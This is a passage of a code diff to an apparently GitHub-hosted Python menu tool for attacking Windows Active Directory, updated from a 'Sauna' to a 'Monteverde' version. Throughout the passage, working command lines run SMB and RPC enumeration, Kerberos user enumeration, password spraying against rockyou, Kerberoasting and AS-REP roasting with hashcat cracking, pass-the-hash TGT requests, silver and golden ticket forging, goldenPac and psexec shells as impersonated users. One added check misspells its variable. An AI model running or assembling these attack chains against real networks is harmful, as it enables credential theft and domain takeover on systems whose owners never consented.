+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
-      command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+      
+      if CheckParams != 1:
+         command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '39':
-      command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      print("\n[*] Please wait, checking to see if any found username is assigned to Kerberous...")
-      command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
-      command("sed -i '/@/!d' KUSERS.tmp")
-      command("sort KUSERS.tmp > USERS2.tmp")
-      os.remove("KUSERS.tmp")	# DELETE FILE
-      os.remove("users.txt")	# DELETE OLD FILE
+      if TIP[:5] != "EMPTY":
+         print("\n[*] Please wait, checking to see if any found username is assigned to Kerberous...")
+         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+         command("sed -i '/@/!d' KUSERS.tmp")
+         command("sort KUSERS.tmp > USERS2.tmp")
+         os.remove("KUSERS.tmp")	# DELETE FILE
+         os.remove("users.txt")		# DELETE OLD FILE
 	
-      for x in range (0, MAXX):
-         TEMP = linecache.getline("USERS2.tmp", x+1)
-         if TEMP != "":
-            TEMP = TEMP.replace("|     ", "")
-            TEMP = TEMP.replace("|_    ", "")
-            TEMP = TEMP.split("@")
-            TEMP = TEMP[0]
-            if TEMP[:1] != " ":							# CONTAINS DATA
-               USER[x] = TEMP							# ASSIGN USER NAME
-               print("[+] Found user ", USER[x])
-               command("echo " + USER[x] + " >> users.txt")			# EXPORT FOUND USER
-         else:
-            USER[x] = " "*COL3							# ASSIGN EMPTY USER
-         if USER[x][:1] != " ": PASS[x] = "."*COL4				# RESET HASH VALUE
-         if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-         if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)
+         for x in range (0, MAXX):
+            TEMP = linecache.getline("USERS2.tmp", x+1)
+            if TEMP != "":
+               TEMP = TEMP.replace("|     ", "")
+               TEMP = TEMP.replace("|_    ", "")
+               TEMP = TEMP.split("@")
+               TEMP = TEMP[0]
+               if TEMP[:1] != " ":							# CONTAINS DATA
+                  USER[x] = TEMP							# ASSIGN USER NAME
+                  print("[+] Found user ", USER[x])
+                  command("echo " + USER[x] + " >> users.txt")				# EXPORT FOUND USER
+            else:
+               USER[x] = " "*COL3							# ASSIGN EMPTY USER
+            if USER[x][:1] != " ": PASS[x] = "."*COL4					# RESET HASH VALUE
+            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
+            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)
 
-      os.remove("USERS2.tmp")
-      print("[*] All done!")
+         os.remove("USERS2.tmp")
+         print("[*] All done!")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      found = 0
-      print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
+      CheckParams = 0
 
-      test1 = linecache.getline("password1.txt", 1)
-      test1 = test1.rstrip("\n")
-      if test1 != "":
-         found = 1
-         USR,PAS = test1.split(":")
-         if len(USR) < COL3: USR = padding(USR, COL3)
-         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      if found == 0:
-         print("\n[*] Now trying all usernames with matching passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile password2.txt")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         found = 0
+         print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
+
+         test1 = linecache.getline("password1.txt", 1)
+         test1 = test1.rstrip("\n")
+         if test1 != "":
+            found = 1
+            USR,PAS = test1.split(":")
+            if len(USR) < COL3: USR = padding(USR, COL3)
+            if len(PAS) < COL4: PAS = padding(PAS, COL4)
+
+         if found == 0:
+            print("\n[*] Now trying all usernames with matching passwords...")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords users.txt -outputfile password2.txt")
          
-      test2 = linecache.getline("password2.txt", 1)
-      test2 = test2.rstrip("\n")
-      if test2 != "":
-         found = 1
-         USR,PAS = test2.split(":")
-         if len(USR) < COL3: USR = padding(USR, COL3)
-         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+         test2 = linecache.getline("password2.txt", 1)
+         test2 = test2.rstrip("\n")
+         if test2 != "":
+            found = 1
+            USR,PAS = test2.split(":")
+            if len(USR) < COL3: USR = padding(USR, COL3)
+            if len(PAS) < COL4: PAS = padding(PAS, COL4)
 
-      if found == 0:
-         print("\n[*] Now trying user Administrator with random passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile password3.txt")
+         if found == 0:
+            print("\n[*] Now trying user Administrator with random passwords...")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile password3.txt")
     
-      test3 = linecache.getline("password3.txt", 1)
-      test3 = test3.rstrip("\n")
-      if test3 != "":
-         found = 1
-         USR,PAS = test3.split(":")        
-         if len(USR) < COL3: USR = padding(USR, COL3)
-         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+         test3 = linecache.getline("password3.txt", 1)
+         test3 = test3.rstrip("\n")
+         if test3 != "":
+            found = 1
+            USR,PAS = test3.split(":")        
+            if len(USR) < COL3: USR = padding(USR, COL3)
+            if len(PAS) < COL4: PAS = padding(PAS, COL4)
 
-      if found == 0:
-         print("\n[*] Now trying all users with random passwords...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
+         if found == 0:
+            print("\n[*] Now trying all users with random passwords...")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
      
-      test4 = linecache.getline("password4.txt", 1)
-      test4 = test4.rstrip("\n")
-      if test4 != "":
-         USR,PAS = test4.split(":") 
-         if len(USR) < COL3: USR = padding(USR, COL3)
-         if len(PAS) < COL4: PAS = padding(PAS, COL4)
+         test4 = linecache.getline("password4.txt", 1)
+         test4 = test4.rstrip("\n")
+         if test4 != "":
+            USR,PAS = test4.split(":") 
+            if len(USR) < COL3: USR = padding(USR, COL3)
+            if len(PAS) < COL4: PAS = padding(PAS, COL4)
 
-      command("rm password*.txt")
+         command("rm password*.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      if linecache.getline('users.txt', 1) != " ":
-         command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
-         print("\n[*] Cracking hash values if they exists...\n")
-         command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
-         command("strings cracked1.txt")
-      else:
-         print("[-] The file users.txt is empty...")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         if linecache.getline('users.txt', 1) != " ":
+            command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
+            print("\n[*] Cracking hash values if they exists...\n")
+            command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
+            command("strings cracked1.txt")
+         else:
+            print("[-] The file users.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      if linecache.getline('users.txt', 1) != " ":
-         command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
-         print("\n[*] Cracking hash values if they exists...\n")
-         command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
-         command("strings cracked2.txt")
-      else:
-         print("[-] The file users.txt is empty...")
+      CheckParams = 0
+
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         if linecache.getline('users.txt', 1) != " ":
+            command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
+            print("\n[*] Cracking hash values if they exists...\n")
+            command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
+            command("strings cracked2.txt")
+         else:
+            print("[-] The file users.txt is empty...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '45':
-      if PAS[:1] != "\"":
+      if TIP[:5] != "EMPTY" and PAS[:1] != "\"":
          NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
          NTM = binascii.hexlify(NTM)
          NTM = str(NTM)
@@ -1245,363 +1478,485 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+      CheckParams = 0
 
-      if PAS[:1] != "\"":
-         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
-         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-      else:
-         if NTM[:1] != "":
-            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
+
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+
+         if PAS[:1] != "\"":
+            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
             command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
-            print("[-] User password or hash required...")
+            if NTM[:1] != "":
+               command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
+               command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+            else:
+               print("[-] User password or hash required...")
 
-      if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-      else:
-          print("[-] TGT was not generated...")
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = "." # Reset value
-
-      for x in range (0, MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PASS[x].rstrip(" ")                 # GET HASH
-
-      if HASH != ".":
-         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
-         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
-         if os.path.exists(IMP.rstrip(" ") + ".ccache"):
-            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+         if os.path.exists(USR.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
          else:
-            print("[-] TGT was not generated...")
+             print("[-] TGT was not generated...")
+         print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+         HASH = "." # Reset value
+
+         for x in range (0, MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+               HASH = PASS[x].rstrip(" ")                 # GET HASH
+
+         if HASH != ".":
+            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
+            command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+            if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+               command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+            else:
+               print("[-] TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '47':
-      print("\nSorry, Pass-the-Ticket has not been implemented yet...")
+      print("\n[*] Sorry, Pass-the-Ticket has not been implemented yet...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
 # Details : Silver Ticket!! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+      CheckParams = 0
 
-      if (NTM[:1] != "") & (SID[:1] != ""):
-         command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
-         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-      else:
-         print("\n[-] Hash or Domain-SID not found...")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-      else:
-          print("\n[-] Golden TGT was not generated...")      
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
-      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = "." # Reset value
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
-      for x in range (0, MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PASS[x].rstrip(" ")                 # GET HASH
+         if (NTM[:1] != "") & (SID[:1] != ""):
+            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
+            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
+         else:
+            print("\n[-] Hash or Domain-SID not found...")
 
-      if HASH != ".":
-         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
-         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+         if os.path.exists(USR.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+         else:
+             print("\n[-] Golden TGT was not generated...")      
 
-      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-      else:
-         print("\n[-] Golden TGT was not generated...")
+         print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+         HASH = "." # Reset value
+
+         for x in range (0, MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+               HASH = PASS[x].rstrip(" ")                 # GET HASH
+
+         if HASH != ".":
+            command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
+            command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+
+         if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+         else:
+            print("\n[-] Golden TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+      CheckParams = 0
 
-      if (NTM[:1] != "") & (SID[:1] != ""):
-         command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
-         command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
-      else:
-         command("echo 'Hash or Domain-SID not found...'")
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-      else:
-          print("[-] Golden TGT was not generated...")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
 
-      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = "." # Reset value
+      if CheckParam != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
 
-      for x in range (0, MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PASS[x].rstrip(" ")                 # GET HASH
-      if HASH != ".":
-         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
-         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+         if (NTM[:1] != "") & (SID[:1] != ""):
+            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
+            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
+         else:
+            command("echo 'Hash or Domain-SID not found...'")
 
-      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
-         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
-      else:
-         print("[-] Golden TGT was not generated...")
+         if os.path.exists(USR.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+         else:
+            print("[-] Golden TGT was not generated...")
+
+         print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+         HASH = "." # Reset value
+
+         for x in range (0, MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+               HASH = PASS[x].rstrip(" ")                 # GET HASH
+         if HASH != ".":
+            command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
+            command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+
+         if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
+         else:
+            print("[-] Golden TGT was not generated...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
-      command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
-      print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = "." # Reset value
+      CheckParams = 0
 
-      for x in range (0, MAXX):
-         if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
-            HASH = PASS[x].rstrip(" ")                 # GET HASH
+      if DOM[:5] == "EMPTY":
+         print("\n[-] Domain name has not been specified...")
+         CheckParams = 1
 
-      if HASH != ".":
-         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
-      else:
-         print("[-] Hash value was not found...")
+      if TIP[:5] == "EMPTY":
+         print("\n[-] Remote IP address has not been specified...")
+         CheckParams = 1
+
+      if CheckParams != 1:
+         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
+         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
+         print("\n[*] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
+         HASH = "." # Reset value
+
+         for x in range (0, MAXX):
+            if USER[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
+               HASH = PASS[x].rstrip(" ")                 # GET HASH
+
+         if HASH != ".":
+            command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
+         else:
+            print("[-] Hash value was not found...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Sauna
+# Version : Monteverde
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
